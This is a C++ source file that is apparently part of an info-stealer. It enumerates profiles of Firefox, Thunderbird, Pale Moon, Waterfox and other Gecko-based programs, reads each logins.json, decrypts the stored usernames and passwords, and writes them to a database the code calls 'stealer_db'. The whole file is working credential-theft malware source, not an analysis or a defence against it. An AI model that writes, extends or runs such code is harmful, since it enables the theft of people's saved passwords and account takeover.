#include "GeckoParser.h"

std::string gecko_paths = "AppData\\Roaming\\";
std::vector<std::string> browsers_gecko = {
	"Mozilla\\Firefox\\",
	"Thunderbird\\",
	"Mozilla\\SeaMonkey\\",
	"NETGATE Technologies\\BlackHawk\\",
	"8pecxstudios\\Cyberfox\\",
	"K-Meleon\\",
	"Mozilla\\icecat\\",
	"Moonchild Productions\\Pale Moon\\",
	"Comodo\\IceDragon\\",
	"Waterfox\\", 
	"Postbox\\",
	"Flock\\Browser\\"
};

BOOL gecko_parser(std::string username, std::string stealer_db)
{
	//Hold data
	DataHolder* data_array = new DataHolder[SQLITE_ROW];
	int data_index = 0;

	std::string target_user_data;
	std::string target_login_data;
	std::string target_key_data;

	for (const auto& dir : browsers_gecko) {

		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";

		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "logins.json")) {
						//std::cout << entry.path() << '\n';

						// Read the JSON file
						std::ifstream file(entry.path() / "logins.json");
						if (!file.is_open()) {
							std::cerr << "Failed to open file.\n";
							return false;
						}

						// Parse the JSON
						json data;
						file >> data;

						// Create decryptor object
						GeckoDecryptor obj;
						std::string program_dir = get_gecko_program_dir(entry.path().string());

						if (!obj.GeckoDecryptorInit(program_dir)) { continue; }

						if (!obj.set_profile_dir(entry.path().string())) { continue; }

						// Loop through all logins
						for (const auto& login : data["logins"]) {
							// Extract fields for each login
							std::string hostname = login["hostname"];
							std::string username = login["encryptedUsername"];
							std::string password = login["encryptedPassword"];

							data_array[data_index].setUrl(hostname);

							obj.decrypt_data(username, username);
							obj.decrypt_data(password, password);

							data_array[data_index].setUsername(username);
							data_array[data_index++].setPassword(password);

							//// Output the extracted values
							//std::cout << "Hostname: " << hostname << std::endl;
							//std::cout << "Encrypted Username: " << username << std::endl;
							//std::cout << "Encrypted Password: " << password << std::endl;
							//std::cout << std::endl;
						}

					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
		}
	}

	if (!dump_data(stealer_db, data_array, data_index))
		return false;

	return true;
}

std::string get_gecko_program_dir(std::string target_user_data)
{
	std::ifstream file(target_user_data + "\\compatibility.ini");
	if (!file.is_open()) {
		//std::cerr << "Could not open the file" << std::endl;
		return "";
	}

	std::string line;
	const std::string key = "LastPlatformDir=";
	while (std::getline(file, line)) {
		if (line.compare(0, key.size(), key) == 0) {
			// Found the key, extract the value
			return line.substr(key.size());
		}
	}

	std::cerr << "LastPlatformDir not found in the file" << std::endl;
	return "";
}